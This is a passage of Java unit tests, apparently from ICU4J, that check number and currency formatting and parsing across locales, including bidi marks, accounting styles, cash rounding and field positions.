SignsAndMarksItem(\"en@numbers=arabext\", false,  \"\\u06F5\\u06F6\",                          56 ),\n            new SignsAndMarksItem(\"en@numbers=arabext\", true,   \"\\u06F5\\u06F6\",                          56 ),\n            new SignsAndMarksItem(\"en@numbers=arabext\", false,  \"-\\u06F6\\u06F7\",                        -67 ),\n            new SignsAndMarksItem(\"en@numbers=arabext\", true,   \"-\\u06F6\\u06F7\",                        -67 ),\n            new SignsAndMarksItem(\"en@numbers=arabext\", true,   \"- \\u06F6\\u06F7\",                       -67 ), // ***\n            new SignsAndMarksItem(\"en@numbers=arabext\", false,  \"\\u200E-\\u200E\\u06F6\\u06F7\",            -67 ),\n            new SignsAndMarksItem(\"en@numbers=arabext\", true,   \"\\u200E-\\u200E\\u06F6\\u06F7\",            -67 ),\n            new SignsAndMarksItem(\"en@numbers=arabext\", true,   \"\\u200E-\\u200E \\u06F6\\u06F7\",           -67 ), // ***\n\n            new SignsAndMarksItem(\"he\",                 false,  \"12\",                                    12 ),\n            new SignsAndMarksItem(\"he\",                 true,   \"12\",                                    12 ),\n            new SignsAndMarksItem(\"he\",                 false,  \"-23\",                                  -23 ),\n            new SignsAndMarksItem(\"he\",                 true,   \"-23\",                                  -23 ),\n            new SignsAndMarksItem(\"he\",                 true,   \"- 23\",                                 -23 ), // ***\n            new SignsAndMarksItem(\"he\",                 false,  \"\\u200E-23\",                            -23 ),\n            new SignsAndMarksItem(\"he\",                 true,   \"\\u200E-23\",                            -23 ),\n            new SignsAndMarksItem(\"he\",                 true,   \"\\u200E- 23\",                           -23 ), // ***\n\n            new SignsAndMarksItem(\"ar\",                 false,  \"\\u0663\\u0664\",                          34 ),\n            new SignsAndMarksItem(\"ar\",                 true,   \"\\u0663\\u0664\",                          34 ),\n            new SignsAndMarksItem(\"ar\",                 false,  \"-\\u0664\\u0665\",                        -45 ),\n            new SignsAndMarksItem(\"ar\",                 true,   \"-\\u0664\\u0665\",                        -45 ),\n            new SignsAndMarksItem(\"ar\",                 true,   \"- \\u0664\\u0665\",                       -45 ), // ***\n            new SignsAndMarksItem(\"ar\",                 false,  \"\\u200F-\\u0664\\u0665\",                  -45 ),\n            new SignsAndMarksItem(\"ar\",                 true,   \"\\u200F-\\u0664\\u0665\",                  -45 ),\n            new SignsAndMarksItem(\"ar\",                 true,   \"\\u200F- \\u0664\\u0665\",                 -45 ), // ***\n\n            new SignsAndMarksItem(\"ar_MA\",              false,  \"12\",                                    12 ),\n            new SignsAndMarksItem(\"ar_MA\",              true,   \"12\",                                    12 ),\n            new SignsAndMarksItem(\"ar_MA\",              false,  \"-23\",                                  -23 ),\n            new SignsAndMarksItem(\"ar_MA\",              true,   \"-23\",                                  -23 ),\n            new SignsAndMarksItem(\"ar_MA\",              true,   \"- 23\",                                 -23 ), // ***\n            new SignsAndMarksItem(\"ar_MA\",              false,  \"\\u200E-23\",                            -23 ),\n            new SignsAndMarksItem(\"ar_MA\",              true,   \"\\u200E-23\",                            -23 ),\n            new SignsAndMarksItem(\"ar_MA\",              true,   \"\\u200E- 23\",                           -23 ), // ***\n\n            new SignsAndMarksItem(\"fa\",                 false,  \"\\u06F5\\u06F6\",                          56 ),\n            new SignsAndMarksItem(\"fa\",                 true,   \"\\u06F5\\u06F6\",                          56 ),\n            new SignsAndMarksItem(\"fa\",                 false,  \"\\u2212\\u06F6\\u06F7\",                   -67 ),\n            new SignsAndMarksItem(\"fa\",                 true,   \"\\u2212\\u06F6\\u06F7\",                   -67 ),\n            new SignsAndMarksItem(\"fa\",                 true,   \"\\u2212 \\u06F6\\u06F7\",                  -67 ), // ***\n            new SignsAndMarksItem(\"fa\",                 false,  \"\\u200E\\u2212\\u200E\\u06F6\\u06F7\",       -67 ),\n            new SignsAndMarksItem(\"fa\",                 true,   \"\\u200E\\u2212\\u200E\\u06F6\\u06F7\",       -67 ),\n            new SignsAndMarksItem(\"fa\",                 true,   \"\\u200E\\u2212\\u200E \\u06F6\\u06F7\",      -67 ), // ***\n\n            new SignsAndMarksItem(\"ps\",                 false,  \"\\u06F5\\u06F6\",                          56 ),\n            new SignsAndMarksItem(\"ps\",                 true,   \"\\u06F5\\u06F6\",                          56 ),\n            new SignsAndMarksItem(\"ps\",                 false,  \"-\\u06F6\\u06F7\",                        -67 ),\n            new SignsAndMarksItem(\"ps\",                 true,   \"-\\u06F6\\u06F7\",                        -67 ),\n            new SignsAndMarksItem(\"ps\",                 true,   \"- \\u06F6\\u06F7\",                       -67 ), // ***\n            new SignsAndMarksItem(\"ps\",                 false,  \"\\u200E-\\u200E\\u06F6\\u06F7\",            -67 ),\n            new SignsAndMarksItem(\"ps\",                 true,   \"\\u200E-\\u200E\\u06F6\\u06F7\",            -67 ),\n            new SignsAndMarksItem(\"ps\",                 true,   \"\\u200E-\\u200E \\u06F6\\u06F7\",           -67 ), // ***\n            new SignsAndMarksItem(\"ps\",                 false,  \"-\\u200E\\u06F6\\u06F7\",                  -67 ),\n            new SignsAndMarksItem(\"ps\",                 true,   \"-\\u200E\\u06F6\\u06F7\",                  -67 ),\n            new SignsAndMarksItem(\"ps\",                 true,   \"-\\u200E \\u06F6\\u06F7\",                 -67 ), // ***\n        };\n        for (SignsAndMarksItem item: items) {\n            ULocale locale = new ULocale(item.locale);\n            NumberFormat numfmt = NumberFormat.getInstance(locale);\n            if (numfmt != null) {\n                numfmt.setParseStrict(!item.lenient);\n                ParsePosition ppos = new ParsePosition(0);\n                Number num = numfmt.parse(item.numString, ppos);\n                if (num != null && ppos.getIndex() == item.numString.length()) {\n                    double parsedValue = num.doubleValue();\n                    if (parsedValue != item.value) {\n                        errln(\"FAIL: locale \" + item.locale + \", lenient \" + item.lenient + \", parse of \\\"\" + item.numString + \"\\\" gives value \" + parsedValue);\n                    }\n                } else {\n                    errln(\"FAIL: locale \" + item.locale + \", lenient \" + item.lenient + \", parse of \\\"\" + item.numString + \"\\\" gives position \" + ppos.getIndex());\n                }\n            } else {\n                errln(\"FAIL: NumberFormat.getInstance for locale \" + item.locale);\n            }\n        }\n    }\n\n    @Test\n    public void TestContext() {\n        // just a minimal sanity check for now\n        NumberFormat nfmt = NumberFormat.getInstance();\n        DisplayContext context = nfmt.getContext(DisplayContext.Type.CAPITALIZATION);\n        if (context != DisplayContext.CAPITALIZATION_NONE) {\n            errln(\"FAIL: Initial NumberFormat.getContext() is not CAPITALIZATION_NONE\");\n        }\n        nfmt.setContext(DisplayContext.CAPITALIZATION_FOR_STANDALONE);\n        context = nfmt.getContext(DisplayContext.Type.CAPITALIZATION);\n        if (context != DisplayContext.CAPITALIZATION_FOR_STANDALONE) {\n            errln(\"FAIL: NumberFormat.getContext() does not return the value set, CAPITALIZATION_FOR_STANDALONE\");\n        }\n    }\n\n    @Test\n    public void TestAccountingCurrency() {\n        String[][] tests = {\n                //locale              num         curr fmt per loc     curr std fmt         curr acct fmt        rt\n                {\"en_US\",             \"1234.5\",   \"$1,234.50\",         \"$1,234.50\",         \"$1,234.50\",         \"true\"},\n                {\"en_US@cf=account\",  \"1234.5\",   \"$1,234.50\",         \"$1,234.50\",         \"$1,234.50\",         \"true\"},\n                {\"en_US\",             \"-1234.5\",  \"-$1,234.50\",        \"-$1,234.50\",        \"($1,234.50)\",       \"true\"},\n                {\"en_US@cf=standard\", \"-1234.5\",  \"-$1,234.50\",        \"-$1,234.50\",        \"($1,234.50)\",       \"true\"},\n                {\"en_US@cf=account\",  \"-1234.5\",  \"($1,234.50)\",       \"-$1,234.50\",        \"($1,234.50)\",       \"true\"},\n                {\"en_US\",             \"0\",        \"$0.00\",             \"$0.00\",             \"$0.00\",             \"true\"},\n                {\"en_US\",             \"-0.2\",     \"-$0.20\",            \"-$0.20\",            \"($0.20)\",           \"true\"},\n                {\"en_US@cf=standard\", \"-0.2\",     \"-$0.20\",            \"-$0.20\",            \"($0.20)\",           \"true\"},\n                {\"en_US@cf=account\",  \"-0.2\",     \"($0.20)\",           \"-$0.20\",            \"($0.20)\",           \"true\"},\n                {\"ja_JP\",             \"10000\",    \"￥10,000\",          \"￥10,000\",          \"￥10,000\",          \"true\" },\n                {\"ja_JP\",             \"-1000.5\",  \"-￥1,000\",          \"-￥1,000\",          \"(￥1,000)\",         \"false\"},\n                {\"ja_JP@cf=account\",  \"-1000.5\",  \"(￥1,000)\",         \"-￥1,000\",          \"(￥1,000)\",         \"false\"},\n                {\"de_DE\",             \"-23456.7\", \"-23.456,70\\u00A0€\", \"-23.456,70\\u00A0€\", \"-23.456,70\\u00A0€\", \"true\" },\n        };\n        for (String[] data : tests) {\n            ULocale loc = new ULocale(data[0]);\n            double num = Double.parseDouble(data[1]);\n            String fmtPerLocExpected   = data[2];\n            String fmtStandardExpected = data[3];\n            String fmtAccountExpected  = data[4];\n            boolean rt = Boolean.parseBoolean(data[5]);\n\n            NumberFormat fmtPerLoc = NumberFormat.getInstance(loc, NumberFormat.CURRENCYSTYLE);\n            expect(fmtPerLoc, num, fmtPerLocExpected, rt);\n\n            NumberFormat fmtStandard = NumberFormat.getInstance(loc, NumberFormat.STANDARDCURRENCYSTYLE);\n            expect(fmtStandard, num, fmtStandardExpected, rt);\n\n            NumberFormat fmtAccount = NumberFormat.getInstance(loc, NumberFormat.ACCOUNTINGCURRENCYSTYLE);\n            expect(fmtAccount, num, fmtAccountExpected, rt);\n        }\n    }\n\n    @Test\n    public void TestCurrencyUsage() {\n        // the 1st one is checking setter/getter, while the 2nd one checks for getInstance\n        // compare the Currency and Currency Cash Digits\n        // Note that as of CLDR 26:\n        // * TWD and PKR switched from 0 decimals to 2; ISK still has 0, so change test to that\n        // * CAD rounds to .05 in the cash style only.\n        for (int i = 0; i < 2; i++) {\n            String original_expected = \"ISK 124\";\n            DecimalFormat custom = null;\n            if (i == 0) {\n                custom = (DecimalFormat) DecimalFormat.getInstance(new ULocale(\"en_US@currency=ISK\"),\n                        DecimalFormat.CURRENCYSTYLE);\n\n                String original = custom.format(123.567);\n                assertEquals(\"Test Currency Context\", original_expected, original);\n\n                // test the getter\n                assertEquals(\"Test Currency Context Purpose\", custom.getCurrencyUsage(),\n                        Currency.CurrencyUsage.STANDARD);\n                custom.setCurrencyUsage(Currency.CurrencyUsage.CASH);\n                assertEquals(\"Test Currency Context Purpose\", custom.getCurrencyUsage(), Currency.CurrencyUsage.CASH);\n            } else {\n                custom = (DecimalFormat) DecimalFormat.getInstance(new ULocale(\"en_US@currency=ISK\"),\n                        DecimalFormat.CASHCURRENCYSTYLE);\n\n                // test the getter\n                assertEquals(\"Test Currency Context Purpose\", custom.getCurrencyUsage(), Currency.CurrencyUsage.CASH);\n            }\n\n            String cash_currency = custom.format(123.567);\n            String cash_currency_expected = \"ISK 124\";\n            assertEquals(\"Test Currency Context\", cash_currency_expected, cash_currency);\n        }\n\n        // the 1st one is checking setter/getter, while the 2nd one checks for getInstance\n        // compare the Currency and Currency Cash Rounding\n        for (int i = 0; i < 2; i++) {\n            String original_rounding_expected = \"CA$123.57\";\n            DecimalFormat fmt = null;\n            if (i == 0) {\n                fmt = (DecimalFormat) DecimalFormat.getInstance(new ULocale(\"en_US@currency=CAD\"),\n                        DecimalFormat.CURRENCYSTYLE);\n\n                String original_rounding = fmt.format(123.566);\n                assertEquals(\"Test Currency Context\", original_rounding_expected, original_rounding);\n\n                fmt.setCurrencyUsage(Currency.CurrencyUsage.CASH);\n            } else {\n                fmt = (DecimalFormat) DecimalFormat.getInstance(new ULocale(\"en_US@currency=CAD\"),\n                        DecimalFormat.CASHCURRENCYSTYLE);\n            }\n\n            String cash_rounding_currency = fmt.format(123.567);\n            String cash__rounding_currency_expected = \"CA$123.55\";\n            assertEquals(\"Test Currency Context\", cash__rounding_currency_expected, cash_rounding_currency);\n        }\n\n        // the 1st one is checking setter/getter, while the 2nd one checks for getInstance\n        // Test the currency change\n        for (int i = 0; i < 2; i++) {\n            DecimalFormat fmt2 = null;\n            if (i == 1) {\n                fmt2 = (DecimalFormat) NumberFormat.getInstance(new ULocale(\"en_US@currency=JPY\"),\n                        NumberFormat.CURRENCYSTYLE);\n                fmt2.setCurrencyUsage(Currency.CurrencyUsage.CASH);\n            } else {\n                fmt2 = (DecimalFormat) NumberFormat.getInstance(new ULocale(\"en_US@currency=JPY\"),\n                        NumberFormat.CASHCURRENCYSTYLE);\n            }\n\n            fmt2.setCurrency(Currency.getInstance(\"PKR\"));\n            String PKR_changed = fmt2.format(123.567);\n            String PKR_changed_expected = \"PKR 124\";\n            assertEquals(\"Test Currency Context\", PKR_changed_expected, PKR_changed);\n        }\n    }\n\n    @Test\n    public void TestCurrencyWithMinMaxFractionDigits() {\n        DecimalFormat df = new DecimalFormat();\n        df.applyPattern(\"¤#,##0.00\");\n        df.setCurrency(Currency.getInstance(\"USD\"));\n        assertEquals(\"Basic currency format fails\", \"$1.23\", df.format(1.234));\n        df.setMaximumFractionDigits(4);\n        assertEquals(\"Currency with max fraction == 4\", \"$1.234\", df.format(1.234));\n        df.setMinimumFractionDigits(4);\n        assertEquals(\"Currency with min fraction == 4\", \"$1.2340\", df.format(1.234));\n    }\n\n    @Test\n    public void TestParseRequiredDecimalPoint() {\n\n        String[] testPattern = { \"00.####\", \"00.0\", \"00\" };\n\n        String value2Parse = \"99\";\n        String value2ParseWithDecimal = \"99.9\";\n        double parseValue  =  99;\n        double parseValueWithDecimal = 99.9;\n        DecimalFormat parser = new DecimalFormat();\n        double result;\n        boolean hasDecimalPoint;\n        for (int i = 0; i < testPattern.length; i++) {\n            parser.applyPattern(testPattern[i]);\n            hasDecimalPoint = testPattern[i].contains(\".\");\n\n            parser.setDecimalPatternMatchRequired(false);\n            try {\n                result = parser.parse(value2Parse).doubleValue();\n                assertEquals(\"wrong parsed value\", parseValue, result);\n            } catch (ParseException e) {\n                TestFmwk.errln(\"Parsing \" + value2Parse + \" should have succeeded with \" + testPattern[i] +\n                            \" and isDecimalPointMatchRequired set to: \" + parser.isDecimalPatternMatchRequired());\n            }\n            try {\n                result = parser.parse(value2ParseWithDecimal).doubleValue();\n                assertEquals(\"wrong parsed value\", parseValueWithDecimal, result);\n            } catch (ParseException e) {\n                TestFmwk.errln(\"Parsing \" + value2ParseWithDecimal + \" should have succeeded with \" + testPattern[i] +\n                            \" and isDecimalPointMatchRequired set to: \" + parser.isDecimalPatternMatchRequired());\n            }\n\n            parser.setDecimalPatternMatchRequired(true);\n            try {\n                result = parser.parse(value2Parse).doubleValue();\n                if(hasDecimalPoint){\n                    TestFmwk.errln(\"Parsing \" + value2Parse + \" should NOT have succeeded with \" + testPattern[i] +\n                            \" and isDecimalPointMatchRequired set to: \" + parser.isDecimalPatternMatchRequired());\n                }\n            } catch (ParseException e) {\n                    // OK, should fail\n            }\n            try {\n                result = parser.parse(value2ParseWithDecimal).doubleValue();\n                if(!hasDecimalPoint){\n                    TestFmwk.errln(\"Parsing \" + value2ParseWithDecimal + \" should NOT have succeeded with \" + testPattern[i] +\n                            \" and isDecimalPointMatchRequired set to: \" + parser.isDecimalPatternMatchRequired() +\n                            \" (got: \" + result + \")\");\n                }\n            } catch (ParseException e) {\n                    // OK, should fail\n            }\n        }\n    }\n\n    @Test\n    public void TestCurrFmtNegSameAsPositive() {\n        DecimalFormatSymbols decfmtsym = DecimalFormatSymbols.getInstance(Locale.US);\n        decfmtsym.setMinusSign('\\u200B'); // ZERO WIDTH SPACE, in ICU4J cannot set to empty string\n        DecimalFormat decfmt = new DecimalFormat(\"\\u00A4#,##0.00;-\\u00A4#,##0.00\", decfmtsym);\n        String currFmtResult = decfmt.format(-100.0);\n        if (!currFmtResult.equals(\"\\u200B$100.00\")) {\n            errln(\"decfmt.toPattern results wrong, expected \\u200B$100.00, got \" + currFmtResult);\n        }\n    }\n\n    @Test\n    public void TestNumberFormatTestDataToString() {\n        new DataDrivenNumberFormatTestData().toString();\n    }\n\n   // Testing for Issue 11805.\n    @Test\n    public void TestFormatToCharacterIteratorIssue11805 () {\n        final double number = -350.76;\n        DecimalFormat dfUS = (DecimalFormat) DecimalFormat.getCurrencyInstance(Locale.US);\n        String strUS = dfUS.format(number);\n        Set<AttributedCharacterIterator.Attribute> resultUS  = dfUS.formatToCharacterIterator(number).getAllAttributeKeys();\n        assertEquals(\"Negative US Results: \" + strUS, 5, resultUS.size());\n\n        // For each test, add assert that all the fields are present and in the right spot.\n        // TODO: Add tests for identify and position of each field, as in IntlTestDecimalFormatAPIC.\n\n        DecimalFormat dfDE = (DecimalFormat) DecimalFormat.getCurrencyInstance(Locale.GERMANY);\n        String strDE = dfDE.format(number);\n        Set<AttributedCharacterIterator.Attribute> resultDE  = dfDE.formatToCharacterIterator(number).getAllAttributeKeys();\n        assertEquals(\"Negative DE Results: \" + strDE, 5, resultDE.size());\n\n        DecimalFormat dfIN = (DecimalFormat) DecimalFormat.getCurrencyInstance(new Locale(\"hi\", \"in\"));\n        String strIN = dfIN.format(number);\n        Set<AttributedCharacterIterator.Attribute> resultIN  = dfIN.formatToCharacterIterator(number).getAllAttributeKeys();\n        assertEquals(\"Negative IN Results: \" + strIN, 5, resultIN.size());\n\n        DecimalFormat dfJP = (DecimalFormat) DecimalFormat.getCurrencyInstance(Locale.JAPAN);\n        String strJP = dfJP.format(number);\n        Set<AttributedCharacterIterator.Attribute> resultJP  = dfJP.formatToCharacterIterator(number).getAllAttributeKeys();\n        assertEquals(\"Negative JA Results: \" + strJP, 3, resultJP.size());\n\n        DecimalFormat dfGB = (DecimalFormat) DecimalFormat.getCurrencyInstance(new Locale(\"en\", \"gb\"));\n        String strGB = dfGB.format(number);\n        Set<AttributedCharacterIterator.Attribute> resultGB  = dfGB.formatToCharacterIterator(number).getAllAttributeKeys();\n        assertEquals(\"Negative GB Results: \" + strGB , 5, resultGB.size());\n\n        DecimalFormat dfPlural = (DecimalFormat) NumberFormat.getInstance(new Locale(\"en\", \"gb\"),\n            NumberFormat.PLURALCURRENCYSTYLE);\n        strGB = dfPlural.format(number);\n        resultGB = dfPlural.formatToCharacterIterator(number).getAllAttributeKeys();\n        assertEquals(\"Negative GB Results: \" + strGB , 5, resultGB.size());\n\n        strGB = dfPlural.format(1);\n        resultGB = dfPlural.formatToCharacterIterator(1).getAllAttributeKeys();\n        assertEquals(\"Negative GB Results: \" + strGB , 4, resultGB.size());\n\n        // Test output with unit value.\n        DecimalFormat auPlural = (DecimalFormat) NumberFormat.getInstance(new Locale(\"en\", \"au\"),\n                NumberFormat.PLURALCURRENCYSTYLE);\n        String strAU = auPlural.format(1L);\n        Set<AttributedCharacterIterator.Attribute> resultAU  =\n                auPlural.formatToCharacterIterator(1L).getAllAttributeKeys();\n        assertEquals(\"Unit AU Result: \" + strAU , 4, resultAU.size());\n\n        // Verify Permille fields.\n        DecimalFormatSymbols sym = new DecimalFormatSymbols(new Locale(\"en\", \"gb\"));\n        DecimalFormat dfPermille = new DecimalFormat(\"####0.##\\u2030\", sym);\n        strGB = dfPermille.format(number);\n        resultGB = dfPermille.formatToCharacterIterator(number).getAllAttributeKeys();\n        assertEquals(\"Negative GB Permille Results: \" + strGB , 3, resultGB.size());\n    }\n\n    // Testing for Issue 11808.\n    @Test\n    public void TestRoundUnnecessarytIssue11808 () {\n        DecimalFormat df = (DecimalFormat) DecimalFormat.getInstance();\n        StringBuffer result = new StringBuffer(\"\");\n        df.setRoundingMode(BigDecimal.ROUND_UNNECESSARY);\n        df.applyPattern(\"00.0#E0\");\n\n        try {\n            df.format(99999.0, result, new FieldPosition(0));\n            fail(\"Missing ArithmeticException for double: \" + result);\n        } catch (ArithmeticException expected) {\n            // The exception should be thrown, since rounding is needed.\n        }\n\n        try {\n            result = df.format(99999, result, new FieldPosition(0));\n            fail(\"Missing ArithmeticException for int: \" + result);\n       } catch (ArithmeticException expected) {\n           // The exception should be thrown, since rounding is needed.\n        }\n\n        try {\n            result = df.format(new BigInteger(\"999999\"), result, new FieldPosition(0));\n            fail(\"Missing ArithmeticException for BigInteger: \" + result);\n        } catch (ArithmeticException expected) {\n            // The exception should be thrown, since rounding is needed.\n        }\n\n        try {\n            result = df.format(new BigDecimal(\"99999\"), result, new FieldPosition(0));\n            fail(\"Missing ArithmeticException for BigDecimal: \" + result);\n        } catch (ArithmeticException expected) {\n            // The exception should be thrown, since rounding is needed.\n        }\n\n        try {\n            result = df.format(new BigDecimal(\"-99999\"), result, new FieldPosition(0));\n            fail(\"Missing ArithmeticException for BigDecimal: \" + result);\n        } catch (ArithmeticException expected) {\n            // The exception should be thrown, since rounding is needed.\n        }\n    }\n\n    // Testing for Issue 11735.\n    @Test\n    public void TestNPEIssue11735() {\n        DecimalFormat fmt = new DecimalFormat(\"0\", new DecimalFormatSymbols(new ULocale(\"en\")));\n        ParsePosition ppos = new ParsePosition(0);\n        assertEquals(\"Currency symbol missing in parse. Expect null result.\",\n                fmt.parseCurrency(\"53.45\", ppos), null);\n    }\n\n    private void CompareAttributedCharacterFormatOutput(AttributedCharacterIterator iterator,\n        List<FieldContainer> expected, String formattedOutput) {\n\n        List<FieldContainer> result = new ArrayList<>();\n        while (iterator.getIndex() != iterator.getEndIndex()) {\n            int start = iterator.getRunStart();\n            int end = iterator.getRunLimit();\n            Iterator it = iterator.getAttributes().keySet().iterator();\n            AttributedCharacterIterator.Attribute attribute = (AttributedCharacterIterator.Attribute) it.next();\n            // For positions with both INTEGER and GROUPING attributes, we want the GROUPING attribute.\n            if (it.hasNext() && attribute.equals(NumberFormat.Field.INTEGER)) {\n                attribute = (AttributedCharacterIterator.Attribute) it.next();\n            }\n            Object value = iterator.getAttribute(attribute);\n            result.add(new FieldContainer(start, end, attribute, value));\n            iterator.setIndex(end);\n        }\n        assertEquals(\"Comparing vector length for \" + formattedOutput,\n            expected.size(), result.size());\n\n        if (!expected.containsAll(result)) {\n          // Print information on the differences.\n          for (int i = 0; i < expected.size(); i++) {\n            System.out.println(\"     expected[\" + i + \"] =\" +\n                expected.get(i).start + \" \" +\n                expected.get(i).end + \" \" +\n                expected.get(i).attribute + \" \" +\n                expected.get(i).value);\n            System.out.println(\" result[\" + i + \"] =\" +\n                result.get(i).start + \" \" +\n                result.get(i).end + \" \" +\n                result.get(i).attribute + \" \" +\n                result.get(i).value);\n          }\n        }\n        assertTrue(\"Comparing vector results for \" + formattedOutput, expected.containsAll(result));\n    }\n\n    // Testing for Issue 11914, missing FieldPositions for some field types.\n    @Test\n    public void TestNPEIssue11914() {\n        // First test: Double value with grouping separators.\n        List<FieldContainer> v1 = new ArrayList<>(7);\n        v1.add(new FieldContainer(0, 3, NumberFormat.Field.INTEGER));\n        v1.add(new FieldContainer(3, 4, NumberFormat.Field.GROUPING_SEPARATOR));\n        v1.add(new FieldContainer(4, 7, NumberFormat.Field.INTEGER));\n        v1.add(new FieldContainer(7, 8, NumberFormat.Field.GROUPING_SEPARATOR));\n        v1.add(new FieldContainer(8, 11, NumberFormat.Field.INTEGER));\n        v1.add(new FieldContainer(11, 12, NumberFormat.Field.DECIMAL_SEPARATOR));\n        v1.add(new FieldContainer(12, 15, NumberFormat.Field.FRACTION));\n\n        Number number = new Double(123456789.9753);\n        ULocale usLoc = new ULocale(\"en-US\");\n        DecimalFormatSymbols US = new DecimalFormatSymbols(usLoc);\n\n        NumberFormat outFmt = NumberFormat.getNumberInstance(usLoc);\n        String numFmtted = outFmt.format(number);\n        AttributedCharacterIterator iterator =\n                outFmt.formatToCharacterIterator(number);\n        CompareAttributedCharacterFormatOutput(iterator, v1, numFmtted);\n\n        // Second test: Double with scientific notation formatting.\n        List<FieldContainer> v2 = new ArrayList<>(7);\n        v2.add(new FieldContainer(0, 1, NumberFormat.Field.INTEGER));\n        v2.add(new FieldContainer(1, 2, NumberFormat.Field.DECIMAL_SEPARATOR));\n        v2.add(new FieldContainer(2, 5, NumberFormat.Field.FRACTION));\n        v2.add(new FieldContainer(5, 6, NumberFormat.Field.EXPONENT_SYMBOL));\n        v2.add(new FieldContainer(6, 7, NumberFormat.Field.EXPONENT_SIGN));\n        v2.add(new FieldContainer(7, 8, NumberFormat.Field.EXPONENT));\n        DecimalFormat fmt2 = new DecimalFormat(\"0.###E+0\", US);\n\n        numFmtted = fmt2.format(number);\n        iterator = fmt2.formatToCharacterIterator(number);\n        CompareAttributedCharacterFormatOutput(iterator, v2, numFmtted);\n\n        // Third test. BigInteger with grouping separators.\n        List<FieldContainer> v3 = new ArrayList<>(7);\n        v3.add(new FieldContainer(0, 1, NumberFormat.Field.SIGN));\n        v3.add(new FieldContainer(1, 2, NumberFormat.Field.INTEGER));\n        v3.add(new FieldContainer(2, 3, NumberFormat.Field.GROUPING_SEPARATOR));\n        v3.add(new FieldContainer(3, 6, NumberFormat.Field.INTEGER));\n        v3.add(new FieldContainer(6, 7, NumberFormat.Field.GROUPING_SEPARATOR));\n        v3.add(new FieldContainer(7, 10, NumberFormat.Field.INTEGER));\n        v3.add(new FieldContainer(10, 11, NumberFormat.Field.GROUPING_SEPARATOR));\n        v3.add(new FieldContainer(11, 14, NumberFormat.Field.INTEGER));\n        v3.add(new FieldContainer(14, 15, NumberFormat.Field.GROUPING_SEPARATOR));\n        v3.add(new FieldContainer(15, 18, NumberFormat.Field.INTEGER));\n        v3.add(new FieldContainer(18, 19, NumberFormat.Field.GROUPING_SEPARATOR));\n        v3.add(new FieldContainer(19, 22, NumberFormat.Field.INTEGER));\n        v3.add(new FieldContainer(22, 23, NumberFormat.Field.GROUPING_SEPARATOR));\n        v3.add(new FieldContainer(23, 26, NumberFormat.Field.INTEGER));\n        BigInteger bigNumberInt = new BigInteger(\"-1234567890246813579\");\n        String fmtNumberBigInt = outFmt.format(bigNumberInt);\n\n        iterator = outFmt.formatToCharacterIterator(bigNumberInt);\n        CompareAttributedCharacterFormatOutput(iterator, v3, fmtNumberBigInt);\n\n        // Fourth test: BigDecimal with exponential formatting.\n        List<FieldContainer> v4 = new ArrayList<>(7);\n        v4.add(new FieldContainer(0, 1, NumberFormat.Field.SIGN));\n        v4.add(new FieldContainer(1, 2, NumberFormat.Field.INTEGER));\n        v4.add(new FieldContainer(2, 3, NumberFormat.Field.DECIMAL_SEPARATOR));\n        v4.add(new FieldContainer(3, 6, NumberFormat.Field.FRACTION));\n        v4.add(new FieldContainer(6, 7, NumberFormat.Field.EXPONENT_SYMBOL));\n        v4.add(new FieldContainer(7, 8, NumberFormat.Field.EXPONENT_SIGN));\n        v4.add(new FieldContainer(8, 9, NumberFormat.Field.EXPONENT));\n\n        java.math.BigDecimal numberBigD = new java.math.BigDecimal(-123456789);\n        String fmtNumberBigDExp = fmt2.format(numberBigD);\n\n        iterator = fmt2.formatToCharacterIterator(numberBigD);\n        CompareAttributedCharacterFormatOutput(iterator, v4, fmtNumberBigDExp);\n\n    }\n\n    // Test that the decimal is shown even when there are no fractional digits\n    @Test\n    public void Test11621() throws Exception {\n        String pat = \"0.##E0\";\n\n        DecimalFormatSymbols icuSym = new DecimalFormatSymbols(Locale.US);\n        DecimalFormat icuFmt = new DecimalFormat(pat, icuSym);\n        icuFmt.setDecimalSeparatorAlwaysShown(true);\n        String icu = ((NumberFormat)icuFmt).format(299792458);\n\n        java.text.DecimalFormatSymbols jdkSym = new java.text.DecimalFormatSymbols(Locale.US);\n        java.text.DecimalFormat jdkFmt = new java.text.DecimalFormat(pat,jdkSym);\n        jdkFmt.setDecimalSeparatorAlwaysShown(true);\n        String jdk = ((java.text.NumberFormat)jdkFmt).format(299792458);\n\n        assertEquals(\"ICU and JDK placement of decimal in exponent\", jdk, icu);\n    }\n\n    private void checkFormatWithField(String testInfo, Format format, Object object,\n            String expected, Format.Field field, int begin, int end) {\n        StringBuffer buffer = new StringBuffer();\n        FieldPosition pos = new FieldPosition(field);\n        format.format(object, buffer, pos);\n\n        assertEquals(\"Test \" + testInfo + \": incorrect formatted text\", expected, buffer.toString());\n\n        if (begin != pos.getBeginIndex() || end != pos.getEndIndex()) {\n            assertEquals(\"Index mismatch\", field + \" \" + begin + \"..\" + end,\n                pos.getFieldAttribute() + \" \" + pos.getBeginIndex() + \"..\" + pos.getEndIndex());\n        }\n    }\n\n    @Test\n    public void TestMissingFieldPositionsCurrency() {\n        DecimalFormat formatter = (DecimalFormat) NumberFormat.getCurrencyInstance(ULocale.US);\n        Number number = new Double(92314587.66);\n        String result = \"$92,314,587.66\";\n\n        checkFormatWithField(\"currency\", formatter, number, result,\n            NumberFormat.Field.CURRENCY, 0, 1);\n        checkFormatWithField(\"integer\", formatter, number, result,\n            NumberFormat.Field.INTEGER, 1, 11);\n        checkFormatWithField(\"grouping separator\", formatter, number, result,\n            NumberFormat.Field.GROUPING_SEPARATOR, 3, 4);\n        checkFormatWithField(\"decimal separator\", formatter, number, result,\n            NumberFormat.Field.DECIMAL_SEPARATOR, 11, 12);\n        checkFormatWithField(\"fraction\", formatter, number, result,\n            NumberFormat.Field.FRACTION, 12, 14);\n    }\n\n    @Test\n    public void TestMissingFieldPositionsNegativeDouble() {\n        // test for exponential fields with double\n        DecimalFormatSymbols us_symbols = new DecimalFormatSymbols(ULocale.US);\n        Number number = new Double(-12345678.90123);\n        DecimalFormat formatter = new DecimalFormat(\"0.#####E+00\", us_symbols);\n        String numFmtted = formatter.format(number);\n\n        checkFormatWithField(\"sign\", formatter, number, numFmtted,\n            NumberFormat.Field.SIGN, 0, 1);\n        checkFormatWithField(\"integer\", formatter, number, numFmtted,\n            NumberFormat.Field.INTEGER, 1, 2);\n        checkFormatWithField(\"decimal separator\", formatter, number, numFmtted,\n            NumberFormat.Field.DECIMAL_SEPARATOR, 2, 3);\n        checkFormatWithField(\"exponent symbol\", formatter, number, numFmtted,\n            NumberFormat.Field.EXPONENT_SYMBOL, 8, 9);\n        checkFormatWithField(\"exponent sign\", formatter, number, numFmtted,\n            NumberFormat.Field.EXPONENT_SIGN, 9, 